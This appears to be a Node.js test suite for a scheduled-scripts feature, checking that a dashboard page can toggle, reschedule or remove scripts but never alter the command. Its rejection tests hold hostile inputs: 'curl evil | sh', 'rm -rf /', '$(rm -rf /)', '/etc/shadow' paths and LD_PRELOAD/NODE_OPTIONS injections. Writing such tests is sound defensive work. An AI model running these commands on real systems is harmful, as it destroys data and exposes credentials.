// scripts.test.mjs — "Scripts on a schedule" (spec 2026-10-17 adopt § Scripts on
// a schedule): parsing, validation, scheduling, the run ledger, the overlap lock,
// and the one rule the whole design hangs on: a page can switch a script on or
// off, reschedule or remove it, and can NEVER say what runs.
//   node --test engine/cron/scripts.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync, readFileSync, chmodSync, existsSync } from 'node:fs';
import { execFileSync, spawn } from 'node:child_process';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { tmpDir } from '../../tests/tmp-dir.mjs';
import {
  normalizeScripts, shapeProblem, scriptProblem, buildScriptJobs, validateChanges, applyChanges,
  parseEnvFile, tailOf, failureReason, SCRIPT_EVERY_FLOOR_MIN,
} from './scripts-lib.mjs';
import { listScripts, saveChanges, runScript, problemFor } from './scripts.mjs';
import { takeRunLock, releaseRunLock, runLockHeld } from './cadence-lock.mjs';
import { readRuns, lastRunByScript } from '../lib/run-ledger.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SCRIPTS_CLI = path.join(HERE, 'scripts.mjs');
const SCHED = path.join(HERE, 'scheduler.mjs');

const every = (minutes) => ({ kind: 'every', minutes, quiet: false });
const row = (over = {}) => ({ enabled: false, argv: ['node', '-e', 'console.log(1)'], cwd: '/state', schedule: every(15), timeout_s: 60, ...over });

// A box with two scripts: one that finishes, one that fails. Real files, real node.
function box() {
  const state = tmpDir('scripts-');
  mkdirSync(path.join(state, 'cockpit'), { recursive: true });
  mkdirSync(path.join(state, 'secrets'), { recursive: true });
  mkdirSync(path.join(state, 'tools'), { recursive: true });
  writeFileSync(path.join(state, 'profile.yaml'), 'cadence:\n  enabled: false\n');
  writeFileSync(path.join(state, 'tools', 'ok.sh'), '#!/bin/sh\necho "first line"\necho "rebuilt money.json ($GREETING)"\n');
  writeFileSync(path.join(state, 'tools', 'bad.sh'), '#!/bin/sh\necho "reading the calendar"\necho "token expired" >&2\nexit 3\n');
  chmodSync(path.join(state, 'tools', 'ok.sh'), 0o755);
  chmodSync(path.join(state, 'tools', 'bad.sh'), 0o755);
  writeFileSync(path.join(state, 'secrets', 'job.env'), 'export GREETING="hello there"\n# a comment\n');
  const file = {
    version: 1,
    scripts: {
      'money-state': { enabled: true, name: 'Money state', description: 'Rebuilds money.json', argv: ['./tools/ok.sh'], cwd: state, schedule: every(1), timeout_s: 30, env_file: path.join(state, 'secrets', 'job.env') },
      'calendar-guard': { enabled: true, name: 'Calendar guard', argv: [path.join(state, 'tools', 'bad.sh')], cwd: state, schedule: every(1), timeout_s: 30 },
      'whatsapp-bridge': { enabled: false, name: 'WhatsApp bridge', argv: ['/opt/whatsapp-bridge/whatsapp-bridge'], cwd: state, schedule: every(5), timeout_s: 30 },
    },
  };
  writeFileSync(path.join(state, 'cockpit', 'scripts.json'), JSON.stringify(file, null, 2));
  return state;
}
const readFile = (state) => JSON.parse(readFileSync(path.join(state, 'cockpit', 'scripts.json'), 'utf8'));

// ---- parsing -------------------------------------------------------------------
test('normalize keeps good rows whole and drops junk ids and non-objects', () => {
  const n = normalizeScripts({ version: 1, scripts: { good: row(), 'Bad Id': row(), arr: [], nul: null } });
  assert.deepEqual(Object.keys(n.scripts), ['good']);
  assert.equal(n.scripts.good.timeout_s, 60);
  assert.equal(normalizeScripts({ scripts: { x: row({ timeout_s: 'soon' }) } }).scripts.x.timeout_s, 600, 'a junk limit falls back to the default');
  assert.deepEqual(normalizeScripts(null).scripts, {});
  assert.deepEqual(normalizeScripts([]).scripts, {});
});

test('argv must be an array of plain strings, never a shell string', () => {
  const ctx = { stateDir: '/state' };
  assert.equal(shapeProblem(row(), ctx), null);
  assert.match(shapeProblem(row({ argv: 'node tools/x.mjs && rm -rf /' }), ctx), /no program/);
  assert.match(shapeProblem(row({ argv: [] }), ctx), /no program/);
  assert.match(shapeProblem(row({ argv: ['node', 42] }), ctx), /plain text/);
  assert.match(shapeProblem(row({ argv: ['node', 'a\0b'] }), ctx), /plain text/);
});

test('cwd must sit under /state and env_file under /state/secrets/', () => {
  const ctx = { stateDir: '/state' };
  assert.equal(shapeProblem(row({ cwd: '/state/cockpit' }), ctx), null);
  for (const cwd of ['/', '/home/pat', '/state/../etc', '/statex', 'state', '']) {
    assert.match(shapeProblem(row({ cwd }), ctx), /folder must be inside \/state/, cwd);
  }
  assert.equal(shapeProblem(row({ env_file: '/state/secrets/vps.env' }), ctx), null);
  for (const env_file of ['/state/.env', '/state/secrets', '/state/secrets/../.env', '/etc/passwd', 'secrets/x.env', 7]) {
    assert.match(shapeProblem(row({ env_file }), ctx), /settings file must be inside/, String(env_file));
  }
  // the one exception the spec allows: an env file the move-in recorded as the person's own
  assert.equal(shapeProblem(row({ env_file: '/state/vps/.env' }), { stateDir: '/state', recordedEnvFiles: ['/state/vps/.env'] }), null);
});

test('scripts take the same schedule shapes as cadence, with a one-minute floor instead of thirty', () => {
  const ctx = { stateDir: '/state' };
  assert.equal(SCRIPT_EVERY_FLOOR_MIN, 1);
  assert.equal(shapeProblem(row({ schedule: every(5) }), ctx), null, 'a */5 job is fine for a script');
  assert.equal(shapeProblem(row({ schedule: { kind: 'times', days: ['mon'], times: ['07:00'] } }), ctx), null);
  assert.equal(shapeProblem(row({ schedule: { kind: 'every-days', n: 2, time: '09:00', anchor: '2026-10-18' } }), ctx), null);
  assert.match(shapeProblem(row({ schedule: every(0) }), ctx), /schedule is not valid/);
  assert.match(shapeProblem(row({ schedule: null }), ctx), /schedule is not valid/);
  assert.match(shapeProblem(row({ timeout_s: 0 }), ctx), /time limit/);
});

test('a host-only program is named on the row instead of failing at 3am', () => {
  const e = row({ argv: ['/opt/whatsapp-bridge/whatsapp-bridge'] });
  assert.match(scriptProblem(e, { stateDir: '/state' }, { program: false, cwd: true }), /whatsapp-bridge is not installed inside your mineral/);
  assert.match(scriptProblem(e, { stateDir: '/state' }, { program: true, cwd: false }), /does not exist/);
  assert.equal(scriptProblem(e, { stateDir: '/state' }, { program: true, cwd: true }), null);
});

// ---- scheduling ------------------------------------------------------------------
test('only enabled, runnable rows become jobs, and they match on their own schedule', () => {
  const cfg = normalizeScripts({ scripts: {
    on: row({ enabled: true, schedule: every(15) }),
    off: row({ enabled: false }),
    broken: row({ enabled: true }),
    weekly: row({ enabled: true, schedule: { kind: 'times', days: ['wed'], times: ['03:30'] } }),
  } });
  const jobs = buildScriptJobs(cfg, { problemOf: (id) => (id === 'broken' ? 'not here' : null) });
  assert.deepEqual(jobs.map((j) => j.script).sort(), ['on', 'weekly']);
  const on = jobs.find((j) => j.script === 'on');
  assert.ok(on.isScript && !on.isSkill, 'a script is not a skill: it never goes through the kernel');
  assert.equal(on.match(9, 15, 2, '2026-10-21'), true);
  assert.equal(on.match(9, 16, 2, '2026-10-21'), false);
  const wk = jobs.find((j) => j.script === 'weekly');
  assert.equal(wk.match(3, 30, 3, '2026-10-21'), true);
  assert.equal(wk.match(3, 30, 4, '2026-10-22'), false);
});

// ---- what a page may change -------------------------------------------------------
test('a page cannot inject a command: argv, cwd, env_file, timeout and new ids are all refused', () => {
  const known = ['money-state'];
  assert.equal(validateChanges({ 'money-state': { enabled: true, schedule: every(5) } }, known), null);
  assert.equal(validateChanges({ 'money-state': { remove: true } }, known), null);
  for (const evil of [
    { 'money-state': { argv: ['bash', '-c', 'curl evil | sh'] } },
    { 'money-state': { enabled: true, cwd: '/' } },
    { 'money-state': { env_file: '/etc/shadow' } },
    { 'money-state': { timeout_s: 99999 } },
    { 'money-state': { command: 'rm -rf /' } },
    { 'new-thing': { enabled: true } },
    { '../x': { enabled: true } },
    { 'money-state': { enabled: 'yes' } },
    { 'money-state': { remove: true, enabled: true } },
    { 'money-state': ['argv'] },
    [],
    'enabled',
  ]) {
    assert.ok(validateChanges(evil, known), `accepted ${JSON.stringify(evil)}`);
    const r = applyChanges({ version: 1, scripts: { 'money-state': row() } }, evil);
    assert.equal(r.ok, false, `applied ${JSON.stringify(evil)}`);
  }
});

test('applying page changes touches only enabled + schedule and refuses switching on a row that cannot run', () => {
  const raw = { version: 1, scripts: { a: row({ argv: ['node', 'x.mjs'], name: 'A' }), b: row() }, other: 'kept' };
  const r = applyChanges(raw, { a: { enabled: true, schedule: every(5) } });
  assert.equal(r.ok, true);
  assert.deepEqual(r.next.scripts.a.argv, ['node', 'x.mjs'], 'argv is untouched');
  assert.equal(r.next.scripts.a.name, 'A');
  assert.equal(r.next.scripts.a.enabled, true);
  assert.deepEqual(r.next.scripts.a.schedule, every(5));
  assert.equal(r.next.other, 'kept', 'unknown top-level fields survive');
  assert.equal(raw.scripts.a.enabled, false, 'the input is never mutated');
  const refused = applyChanges(raw, { a: { enabled: true } }, { problemOf: () => 'node is not installed inside your mineral' });
  assert.equal(refused.ok, false);
  assert.match(refused.error, /a cannot be switched on: node is not installed/);
  assert.equal(applyChanges(raw, { a: { enabled: false } }, { problemOf: () => 'broken' }).ok, true, 'switching OFF a broken row is always allowed');
});

test('removing a row archives it under "removed", never destroys it', () => {
  const r = applyChanges({ version: 1, scripts: { a: row({ enabled: true }) } }, { a: { remove: true } }, { nowIso: '2026-10-18T00:00:00Z' });
  assert.equal(r.ok, true);
  assert.equal(r.next.scripts.a, undefined);
  assert.equal(r.next.removed.a.removed_at, '2026-10-18T00:00:00Z');
  assert.equal(r.next.removed.a.enabled, false);
  assert.deepEqual(r.next.removed.a.argv, row().argv);
  assert.deepEqual(Object.keys(normalizeScripts(r.next).scripts), [], 'a removed row never fires');
});

// ---- small helpers ---------------------------------------------------------------------
test('env files are read as data, never executed', () => {
  assert.deepEqual(parseEnvFile('export A="1 2"\nB=x # note\n# c\nC=\'$(rm -rf /)\'\nbad line\n'), { A: '1 2', B: 'x', C: '$(rm -rf /)' });
});
test('an env file cannot change which program runs or make one run code at start-up', () => {
  const env = parseEnvFile('PATH=/tmp/evil\nexport NODE_OPTIONS=--require=/tmp/x.js\nLD_PRELOAD=/tmp/x.so\nBASH_ENV=/tmp/x\nHOME=/tmp\nTELEGRAM_BOT_TOKEN=abc\n');
  assert.deepEqual(env, { TELEGRAM_BOT_TOKEN: 'abc' });
});
test('tail keeps the last few non-empty lines, bounded', () => {
  assert.deepEqual(tailOf('a\n\nb\nc\n', 2), ['b', 'c']);
  assert.equal(tailOf('x'.repeat(1000))[0].length, 300);
});
test('failure reasons say what happened', () => {
  assert.equal(failureReason(null, 10), null);
  assert.equal(failureReason({ code: 3 }, 10), 'exited with code 3');
  assert.equal(failureReason({ killed: true, signal: 'SIGTERM' }, 10), 'stopped after 10 s (its time limit)');
  assert.match(failureReason({ code: 'ENOENT' }, 10), /could not start/);
});

// ---- on a box: list, save, run, ledger, lock ------------------------------------------------
test('list joins the file, what exists inside the container, and the last run', () => {
  const state = box();
  const st = listScripts(state);
  const by = Object.fromEntries(st.scripts.map((s) => [s.id, s]));
  assert.equal(by['money-state'].problem, null);
  assert.equal(by['money-state'].name, 'Money state');
  assert.equal(by['money-state'].when, 'every 1m');
  assert.match(by['whatsapp-bridge'].problem, /not installed inside your mineral/);
  assert.equal(by['calendar-guard'].last, null, 'never run yet');
});

test('a run records its honest exit status, summary and output tail into the ledger', async () => {
  const state = box();
  const ok = await runScript(state, 'money-state', { source: 'cron' });
  assert.equal(ok.status, 'ok');
  const bad = await runScript(state, 'calendar-guard', { source: 'cron' });
  assert.equal(bad.status, 'fail');
  assert.equal(bad.reason, 'exited with code 3');
  const runs = readRuns(state);
  assert.deepEqual(runs.map((r) => [r.job, r.status]), [['script:money-state', 'ok'], ['script:calendar-guard', 'fail']]);
  assert.match(runs[0].summary, /rebuilt money\.json \(hello there\)/, 'the env file reached the program');
  const last = lastRunByScript(state);
  assert.deepEqual(last['calendar-guard'].tail, ['reading the calendar', 'token expired']);
  assert.equal(last['calendar-guard'].error, 'exited with code 3');
  assert.equal(listScripts(state).scripts.find((s) => s.id === 'calendar-guard').last.status, 'fail');
});

test('a script past its time limit is stopped and recorded as failed', async () => {
  const state = box();
  const f = readFile(state);
  f.scripts.slow = { enabled: true, argv: ['node', '-e', 'setTimeout(()=>{}, 60000)'], cwd: state, schedule: every(1), timeout_s: 1 };
  writeFileSync(path.join(state, 'cockpit', 'scripts.json'), JSON.stringify(f));
  const r = await runScript(state, 'slow');
  assert.equal(r.status, 'fail');
  assert.match(r.reason, /stopped after 1 s/);
});

test('a row that cannot run is never started', async () => {
  const state = box();
  const r = await runScript(state, 'whatsapp-bridge');
  assert.equal(r.status, 'skipped');
  assert.match(r.reason, /not installed inside your mineral/);
  assert.equal(readRuns(state).length, 0, 'nothing is recorded as having run');
});

test('the overlap lock: a second start while one is running is refused, and a stale lock is taken over', async () => {
  const state = box();
  assert.equal(takeRunLock(state, 'money-state', { timeout_s: 30 }), true);
  assert.equal(runLockHeld(state, 'money-state'), true);
  const r = await runScript(state, 'money-state');
  assert.equal(r.status, 'skipped');
  assert.match(r.reason, /still running/);
  releaseRunLock(state, 'money-state');
  // a lock whose holder is long dead is stale
  mkdirSync(path.join(state, '.kernel', 'locks'), { recursive: true });
  writeFileSync(path.join(state, '.kernel', 'locks', 'script-money-state.lock'), JSON.stringify({ pid: 999999, started: new Date().toISOString(), timeout_s: 30 }));
  assert.equal(runLockHeld(state, 'money-state'), false);
  // and so is one older than its run's time limit plus a minute
  writeFileSync(path.join(state, '.kernel', 'locks', 'script-money-state.lock'), JSON.stringify({ pid: process.pid, started: new Date(Date.now() - 5 * 60000).toISOString(), timeout_s: 30 }));
  assert.equal(runLockHeld(state, 'money-state'), false);
  assert.equal((await runScript(state, 'money-state')).status, 'ok');
  assert.equal(existsSync(path.join(state, '.kernel', 'locks', 'script-money-state.lock')), false, 'released after the run');
});

test('save: the box re-validates, refuses enabling a host-only program, and writes atomically', () => {
  const state = box();
  const before = readFileSync(path.join(state, 'cockpit', 'scripts.json'), 'utf8');
  const refused = saveChanges(state, { 'whatsapp-bridge': { enabled: true } });
  assert.equal(refused.ok, false);
  assert.match(refused.error, /cannot be switched on: .*not installed inside your mineral/);
  assert.equal(readFileSync(path.join(state, 'cockpit', 'scripts.json'), 'utf8'), before, 'a refused save changes nothing');
  const injected = saveChanges(state, { 'money-state': { argv: ['sh', '-c', 'id'] } });
  assert.equal(injected.ok, false);
  assert.equal(readFileSync(path.join(state, 'cockpit', 'scripts.json'), 'utf8'), before);
  const ok = saveChanges(state, { 'money-state': { enabled: false, schedule: every(30) }, 'calendar-guard': { remove: true } });
  assert.equal(ok.ok, true);
  const after = readFile(state);
  assert.equal(after.scripts['money-state'].enabled, false);
  assert.deepEqual(after.scripts['money-state'].argv, ['./tools/ok.sh']);
  assert.ok(after.removed['calendar-guard'], 'removed, and kept');
});

test('the CLI: save from base64 stdin, list as one SCRIPTS_STATE line, Run now reports the outcome', () => {
  const state = box();
  const b64 = Buffer.from(JSON.stringify({ 'money-state': { enabled: false } })).toString('base64');
  const out = execFileSync('node', [SCRIPTS_CLI, state, 'save'], { input: b64 + '\n', encoding: 'utf8' });
  assert.match(out, /OK: scripts saved/);
  assert.throws(() => execFileSync('node', [SCRIPTS_CLI, state, 'save'], { input: Buffer.from(JSON.stringify({ 'money-state': { argv: ['id'] } })).toString('base64'), encoding: 'utf8' }),
    (e) => /argv cannot be changed from the app/.test(e.stdout));
  const list = execFileSync('node', [SCRIPTS_CLI, state, 'list'], { encoding: 'utf8' });
  assert.match(list, /^SCRIPTS_STATE \{/);
  assert.equal(JSON.parse(list.slice('SCRIPTS_STATE '.length)).scripts.length, 3);
  const ran = execFileSync('node', [SCRIPTS_CLI, state, 'run', 'money-state'], { encoding: 'utf8', env: { ...process.env, AIOS_SCRIPT_RUN_WAIT_S: '15' } });
  assert.match(ran, /rebuilt money\.json/);
  assert.match(ran, /finished cleanly/);
  assert.equal(lastRunByScript(state)['money-state'].source, 'dashboard');
  assert.throws(() => execFileSync('node', [SCRIPTS_CLI, state, 'run', 'calendar-guard'], { encoding: 'utf8', env: { ...process.env, AIOS_SCRIPT_RUN_WAIT_S: '15' } }),
    (e) => /It failed: exited with code 3/.test(e.stdout));
  assert.throws(() => execFileSync('node', [SCRIPTS_CLI, state, 'run', 'whatsapp-bridge'], { encoding: 'utf8' }),
    (e) => /ERROR: .*not installed inside your mineral/.test(e.stdout));
});

// ---- the real scheduler fires them ---------------------------------------------------------
function runScheduler(dir, ms = 4000) {
  return new Promise((resolve) => {
    const p = spawn('node', [SCHED, dir], { stdio: ['ignore', 'pipe', 'pipe'] });
    let out = '';
    p.stdout.on('data', (c) => { out += c; });
    p.stderr.on('data', (c) => { out += c; });
    setTimeout(() => { p.kill('SIGKILL'); resolve(out); }, ms);
  });
}

test('the scheduler fires enabled scripts with honest exit status, and skips one that cannot run', async () => {
  const state = box();
  const out = await runScheduler(state);
  assert.match(out, /cadence: script money-state/);
  assert.match(out, /cadence: script calendar-guard/);
  assert.doesNotMatch(out, /script whatsapp-bridge/);
  assert.match(out, /script calendar-guard .* failed: exited with code 3/);
  const last = lastRunByScript(state);
  assert.equal(last['money-state'].status, 'ok');
  assert.equal(last['money-state'].source, 'cron');
  assert.equal(last['calendar-guard'].status, 'fail');
});

test('--plan-json lists the scripts with their problems, and --at fires them on their minute', () => {
  const state = box();
  const plan = JSON.parse(execFileSync('node', [SCHED, state, '--plan-json'], { encoding: 'utf8' }));
  const by = Object.fromEntries(plan.scripts.map((s) => [s.id, s]));
  assert.equal(by['money-state'].problem, null);
  assert.match(by['whatsapp-bridge'].problem, /not installed/);
  const at = execFileSync('node', [SCHED, state, '--at', '09:13 Tue'], { encoding: 'utf8' });
  assert.match(at, /At 09:13 .*script money-state/);
  assert.ok(problemFor(state, normalizeScripts(readFile(state)).scripts['money-state']) === null);
});
